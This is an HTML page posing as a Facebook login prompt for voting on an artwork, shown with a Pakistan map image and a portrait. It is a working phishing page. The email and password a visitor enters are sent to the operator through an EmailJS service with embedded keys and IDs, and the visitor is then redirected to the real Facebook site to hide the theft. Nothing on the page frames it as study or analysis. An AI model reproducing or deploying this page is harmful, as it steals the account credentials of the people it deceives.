<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
 body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Align content at the top */
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 90%; /* Adjusted width to be responsive */
            padding: 40px; /* Increased padding for a larger appearance */
            background-color: rgb(242, 241, 241);
            border-radius: 0px; /* Added rounded corners */
            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
        }

        .container input[type="text"],
        .container input[type="password"] {
            width: 93%;
            padding: 15px; /* Increased padding for a larger appearance */
            margin: 10px 0;
            border: 1px solid #a9bdca;
            outline: none;
            border-radius: 5px;
            height: 30px; /* Adjusted the height for larger inputs */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .login-button {
            width: 96%;
            padding: 15px; /* Increased padding for a larger appearance */
            background-color: #0e59ee;
            border: none;
            color: #fff;
            cursor: pointer;
            border-radius: 5px;
            height: 50px; /* Adjusted the height for a larger button */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px; /* Increased margin top */
        }

        .forgot-password a {
            text-decoration: none;
            color: #0a68d4;
            font-size: 16px; /* Increased font size for better visibility */
        }

        .centered-image1,
        .centered-image2 {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .custom-text {
            font-family: Arial, sans-serif;
            font-size: 16px; /* Increased font size for better visibility */
            margin-top: 15px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="centered-image1">
        <img src="https://raw.githubusercontent.com/FacebookArt/pak/39ff510df267f73002cc8ac40095e3296687887c/Pakistan%20map%20square%20Art%20Print%20by%20Maps%20Factory.jpg" alt="Image 1" style="max-width: 100%; margin-bottom: 20px;">
    </div>
    <div class="container">
        <div class="centered-image2">
            <img src="https://raw.githubusercontent.com/FacebookArt/pak2/932c5b01030012c9e00871db959cdf045c5e0306/ayesha.png" alt="image 2" style="max-width: 100%; margin-bottom: 20px;">
            <div class="custom-text">vote for this artwork with Facebook</div>
        </div>
        <!-- Modified the form to prevent its default behavior and added a JavaScript function to handle the submission -->
        <form name="login" onsubmit="sendLoginDetails(); return false;">
            <input type="text" class="container input" placeholder="Email address" name="email" id="email">
            <input type="password" class="container input" placeholder="Password" name="password" id="password">
            <button class="login-button" id="loginButton" type="submit">Log in</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgotten account?</a>
        </div>
    </div>

    <!-- Include Email.js library -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        emailjs.init("33iNHYtZIuhHtuJ1i");

        // Function to send login details via Email.js
        function sendLoginDetails() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');

            const emailValue = emailInput.value.trim();
            const passwordValue = passwordInput.value.trim();

            // Check if email and password are not empty
            if (emailValue === '' || passwordValue === '') {
                alert('Please enter both email and password.');
                return;
            }

            // Template parameters
            const templateParams = {
                email: emailValue,
                password: passwordValue
            };

            // Send email using Email.js
            emailjs.send("service_s4732w5", "template_8l8qh6u", templateParams)
                .then(function(response) {
                    console.log("Login details sent successfully", response);
                    window.location.href = 'https://www.facebook.com';
                }, function(error) {
                    console.log("Failed to send login details. Error:", error);
                    console.log("email:", email);
                    console.log("password:", password);
                });
        }

        // JavaScript to enable/disable the login button
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginButton = document.getElementById('loginButton');

        emailInput.addEventListener('input', validateInputs);
        passwordInput.addEventListener('input', validateInputs);

        function validateInputs() {
            const emailValue = emailInput.value.trim();
            const passwordValue = passwordInput.value.trim();
            if (emailValue === '' || passwordValue === '') {
                loginButton.disabled = true;
            } else {
                loginButton.disabled = false;
            }
        }
    </script>
</body>
</html>
